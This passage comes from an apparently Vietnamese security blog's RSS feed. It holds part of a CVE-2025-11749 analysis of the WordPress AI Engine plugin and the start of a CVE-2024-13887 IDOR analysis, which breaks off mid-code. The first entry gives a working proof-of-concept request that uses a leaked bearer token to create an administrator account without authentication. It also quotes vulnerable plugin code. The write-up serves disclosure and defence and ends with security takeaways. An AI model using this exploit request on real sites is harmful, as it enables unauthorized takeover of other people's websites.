=&amp;gt; sanitize_email( $a[&amp;#39;user_email&amp;#39;] ),&#xA;          &amp;#39;user_pass&amp;#39; =&amp;gt; $a[&amp;#39;user_pass&amp;#39;] ?? wp_generate_password( 12, true ),&#xA;          &amp;#39;display_name&amp;#39; =&amp;gt; sanitize_text_field( $a[&amp;#39;display_name&amp;#39;] ?? &amp;#39;&amp;#39; ),&#xA;          &amp;#39;role&amp;#39; =&amp;gt; sanitize_key( $a[&amp;#39;role&amp;#39;] ?? get_option( &amp;#39;default_role&amp;#39;, &amp;#39;subscriber&amp;#39; ) ),&#xA;        ];&#xA;        $uid = wp_insert_user( $data );&#xA;        if ( is_wp_error( $uid ) ) {&#xA;          $r[&amp;#39;error&amp;#39;] = [ &amp;#39;code&amp;#39; =&amp;gt; $uid-&amp;gt;get_error_code(), &amp;#39;message&amp;#39; =&amp;gt; $uid-&amp;gt;get_error_message() ];&#xA;        }&#xA;        else {&#xA;          $this-&amp;gt;add_result_text( $r, &amp;#39;User created ID &amp;#39; . $uid );&#xA;        }&#xA;        break;&#xA;    ...&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m g·ªçi ƒë·∫øn &lt;code&gt;wp_insert_user&lt;/code&gt; ƒë·ªÉ t·∫°o t√†i kho·∫£n WordPress m·ªõi v·ªõi t·∫•t c·∫£ c√°c gi√° tr·ªã do ta ki·ªÉm so√°t =&amp;gt; &lt;strong&gt;Privilege Escalation&lt;/strong&gt; x·∫£y ra&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Unauthenticated Attacker&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Access /wp-json&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;REST API exposes MCP endpoints (Bearer Token leaked)&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;Extract Bearer Token from response&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Send POST request to /wp-json/mcp/v1/{token}/messages&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;permission_callback ‚Üí handle_noauth_access()&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Bearer Token valid&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;wp_set_current_user(admin)&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;handle_message()&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;method = tools/call&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;execute_tool()&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;mwai_mcp_callback triggered&amp;#34;]&#xA;&#xA;L --&amp;gt; M[&amp;#34;dispatch()&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;wp_create_user()&amp;#34;]&#xA;&#xA;N --&amp;gt; O[&amp;#34;New administrator account created&amp;#34;]&#xA;&#xA;O --&amp;gt; P[&amp;#34;Privilege Escalation&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Truy c·∫≠p endpoint &lt;code&gt;/wp-json&lt;/code&gt; ƒë·ªÉ l·∫•y gi√° tr·ªã &lt;strong&gt;Bearer Token&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;G·ª≠i request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/mcp/v1/{token}/messages HTTP/1.1&#xA;Host: localhost&#xA;&#xA;{&#xA;  &amp;#34;id&amp;#34;: 1,&#xA;  &amp;#34;method&amp;#34;: &amp;#34;tools/call&amp;#34;,&#xA;  &amp;#34;params&amp;#34;: {&#xA;    &amp;#34;name&amp;#34;: &amp;#34;wp_create_user&amp;#34;,&#xA;    &amp;#34;arguments&amp;#34;: {&#xA;      &amp;#34;user_login&amp;#34;: &amp;#34;hacker&amp;#34;,&#xA;      &amp;#34;user_email&amp;#34;: &amp;#34;hacker@gmail.com&amp;#34;,&#xA;      &amp;#34;user_pass&amp;#34;: &amp;#34;hacker&amp;#34;,&#xA;      &amp;#34;display_name&amp;#34;: &amp;#34;hacker&amp;#34;,&#xA;      &amp;#34;role&amp;#34;: &amp;#34;administrator&amp;#34;&#xA;    }&#xA;  },&#xA;  &amp;#34;name&amp;#34;: &amp;#34;2&amp;#34;,&#xA;  &amp;#34;arguments&amp;#34;: &amp;#34;3&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Login v·ªõi t√†i kho·∫£n v·ª´a t·∫°o&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/result.png&#34; title=&#34;K·∫øt qu·∫£&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;K·∫øt qu·∫£&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/result.png&#39; alt=&#34;Result&#34; height=&#34;638&#34; width=&#34;1243&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;K·∫øt qu·∫£&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng trong AI Engine (‚â§ 3.1.3) xu·∫•t ph√°t t·ª´ vi·ªác &lt;strong&gt;k·∫øt h·ª£p sai gi·ªØa c∆° ch·∫ø ‚ÄúNo-Auth URL‚Äù v√† logic ph√¢n quy·ªÅn n·ªôi b·ªô&lt;/strong&gt;, d·∫´n ƒë·∫øn vi·ªác &lt;strong&gt;c·∫•p quy·ªÅn qu·∫£n tr·ªã ch·ªâ d·ª±a tr√™n m·ªôt Bearer Token b·ªã l·ªô c√¥ng khai&lt;/strong&gt;.&#xA;Khi endpoint MCP ƒë∆∞·ª£c hi·ªÉn th·ªã trong &lt;code&gt;/wp-json&lt;/code&gt;, k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ thu th·∫≠p token, g·ªçi tr·ª±c ti·∫øp API v√† th·ª±c thi c√°c h√†nh ƒë·ªông nh·∫°y c·∫£m nh∆∞ t·∫°o t√†i kho·∫£n qu·∫£n tr·ªã m·ªõi m√† &lt;strong&gt;kh√¥ng c·∫ßn x√°c th·ª±c&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;M·∫∑c d√π quy·ªÅn admin ch·ªâ t·ªìn t·∫°i trong v√≤ng ƒë·ªùi c·ªßa request, nh∆∞ng ch·ªâ c·∫ßn &lt;strong&gt;m·ªôt l·∫ßn g·ªçi h·ª£p l·ªá&lt;/strong&gt; l√† ƒë·ªß ƒë·ªÉ t·∫°o t√†i kho·∫£n qu·∫£n tr·ªã vƒ©nh vi·ªÖn, d·∫´n ƒë·∫øn &lt;strong&gt;Privilege Escalation ho√†n ch·ªânh&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° v3.1.4 ch·ªâ ·∫©n endpoint kh·ªèi REST index, gi√∫p gi·∫£m kh·∫£ nƒÉng b·ªã d√≤ qu√©t, nh∆∞ng &lt;strong&gt;kh√¥ng gi·∫£i quy·∫øt tri·ªát ƒë·ªÉ v·∫•n ƒë·ªÅ thi·∫øt k·∫ø b·∫£o m·∫≠t c·ªët l√µi&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Kh√¥ng bao gi·ªù s·ª≠ d·ª•ng token trong URL nh∆∞ c∆° ch·∫ø x√°c th·ª±c.&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;·∫®n endpoint (&lt;code&gt;show_in_rest = false&lt;/code&gt;) kh√¥ng ƒë·ªìng nghƒ©a v·ªõi b·∫£o m·∫≠t.&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;&lt;code&gt;wp_set_current_user()&lt;/code&gt; kh√¥ng n√™n ƒë∆∞·ª£c d√πng cho x√°c th·ª±c t·ª´ request b√™n ngo√†i.&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;M·ªçi API c√≥ kh·∫£ nƒÉng thay ƒë·ªïi tr·∫°ng th√°i h·ªá th·ªëng ph·∫£i c√≥ x√°c th·ª±c m·∫°nh (auth + authorization).&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vi·ªác g√°n quy·ªÅn admin trong request, d√π t·∫°m th·ªùi, v·∫´n ƒë·ªß ƒë·ªÉ g√¢y leo thang ƒë·∫∑c quy·ªÅn.&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;REST API c·∫ßn ƒë∆∞·ª£c thi·∫øt k·∫ø theo nguy√™n t·∫Øc ‚Äúdeny by default‚Äù.&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ai-engine/vulnerability/wordpress-ai-engine-plugin-3-1-3-unauthenticated-sensitive-information-exposure-to-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress AI Engine Plugin &amp;lt;= 3.1.3 is vulnerable to a high priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2024-13887 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-31-cve-2024-13887/</link>
      <pubDate>Wed, 31 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-31-cve-2024-13887/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-31-cve-2024-13887/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Business Directory Plugin ‚Äì Easy Listing Directories for WordPress&lt;/strong&gt; t·ªìn t·∫°i l·ªó h·ªïng &lt;strong&gt;Insecure Direct Object Reference (IDOR)&lt;/strong&gt; trong t·∫•t c·∫£ c√°c phi√™n b·∫£n t·ª´ tr∆∞·ªõc ƒë·∫øn &lt;strong&gt;6.4.14&lt;/strong&gt;, th√¥ng qua h√†m &lt;code&gt;ajax_listing_submit_image_upload&lt;/code&gt; do thi·∫øu ki·ªÉm tra h·ª£p l·ªá ƒë·ªëi v·ªõi m·ªôt kh√≥a do ng∆∞·ªùi d√πng ki·ªÉm so√°t. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng &lt;strong&gt;ch∆∞a x√°c th·ª±c&lt;/strong&gt; c√≥ th·ªÉ &lt;strong&gt;t·∫£i l√™n h√¨nh ·∫£nh t√πy √Ω v√†o c√°c listing&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2024-13887&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2024-13887&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 6.4.14&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 6.4.15&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/business-directory-plugin/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Business Directory Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Business Directory&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;6.4.14&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;6.4.15&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒëƒÉng k√Ω AJAX handler &lt;strong&gt;cho ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_nopriv_wpbdp-listing-submit-image-upload&amp;#39;, array( &amp;amp;$this, &amp;#39;ajax_listing_submit_image_upload&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_nopriv&lt;/code&gt; l√† hook d√†nh cho t·∫•t c·∫£ ng∆∞·ªùi d√πng, k·∫øt c·∫£ ch∆∞a ƒëƒÉng nh·∫≠p. Khi c√≥ request t·ªõi endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; v·ªõi param &lt;code&gt;action=wpbdp-listing-submit-image-upload&lt;/code&gt; th√¨ callback &lt;code&gt;ajax_listing_submit_image_upload&lt;/code&gt; ƒë∆∞·ª£c g·ªçi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function ajax_listing_submit_image_upload() {&#xA;    $res = new WPBDP_AJAX_Response();&#xA;&#xA;    $listing_id = intval( $_REQUEST[&amp;#39;listing_id&amp;#39;] );&#xA;    ...&#xA;    $files  = wpbdp_flatten_files_array( isset( $_FILES[&amp;#39;images&amp;#39;] ) ? $_FILES[&amp;#39;images&amp;#39;] : array() );&#xA;    $errors = array();&#xA;&#xA;    $listing         = WPBDP_Listing::get( $listing_id );&#xA;    $slots_available = 0;&#xA;    $plan            = $listing-&amp;gt;get_fee_plan();&#xA;    if ( ! $plan ) {&#xA;        return $res-&amp;gt;send_error( __( &amp;#39;Please select a plan before uploading images to the listing&amp;#39;, &amp;#39;business-directory-plugin&amp;#39; ) );&#xA;    }&#xA;&#xA;    $slots_available = absint( $plan-&amp;gt;fee_images ) - absint( $_POST[&amp;#39;images_count&amp;#39;] );&#xA;    if ( 0 &amp;gt;= $slots_available ) {&#xA;        return $res-&amp;gt;send_error( __( &amp;#39;Can not upload any more images for this listing.&amp;#39;, &amp;#39;business-directory-plugin&amp;#39; ) );&#xA;    } elseif ( $slots_available &amp;lt; count( $files ) ) {&#xA;        return $res-&amp;gt;send_error(&#xA;            sprintf(&#xA;                _nx(&#xA;                    &amp;#39;You\&amp;#39;re trying to upload %1$d images, but only have %2$d slot available. Please adjust your selection.&amp;#39;,&#xA;                    &amp;#39;You\&amp;#39;re trying to upload %1$d images, but only have %2$d slots available. Please adjust your selection.&amp;#39;,&#xA;                    $slots_available,&#xA;                    &amp;#39;listing image upload&amp;#39;,&#xA;                    &amp;#39;business-directory-plugin&amp;#39;&#xA;                ),&#xA;                count( $files ),&#xA;                $slots_available&#xA;            )&#xA;        );&#xA;    }&#xA;&#xA;    foreach ( $files as $i =&amp;gt; $file ) {&#xA;        $image_error   = &amp;#39;&amp;#39;;&#xA;        $attachment_id = wpbdp_media_upload(&#xA;            $file,&#xA;            true,&#xA;            true,&#xA;            array(&#xA;                &amp;#39;image&amp;#39;      =&amp;gt; true,&#xA;                &amp;#39;min-size&amp;#39;   =&amp;gt; intval( wpbdp_get_option( &amp;#39;image-min-filesize&amp;#39; ) ) * 1024,&#xA;                &amp;#39;max-size&amp;#39;   =&amp;gt; intval( wpbdp_get_option( &amp;#39;image-max-filesize&amp;#39; ) ) * 1024,&#xA;                &amp;#39;min-width&amp;#39;  =&amp;gt; wpbdp_get_option( &amp;#39;image-min-width&amp;#39; ),&#xA;                &amp;#39;min-height&amp;#39; =&amp;gt; wpbdp_get_option( &amp;#39;image-min-height&amp;#39; ),&#xA;            ),&#xA;            $image_error&#xA;        ); // TODO: handle errors.&#xA;&#xA;        if ( $image_error ) {&#xA;            $errors[ $file[&amp;#39;name&amp;#39;] ] = $image_error;&#xA;        } else {&#xA;            $attachments[] = $attachment_id;&#xA;        }&#xA;    }&#xA;&#xA;    $html = &amp;#39;&amp;#39;;&#xA;    foreach ( $attachments as $attachment_id ) {&#xA;        $html .= 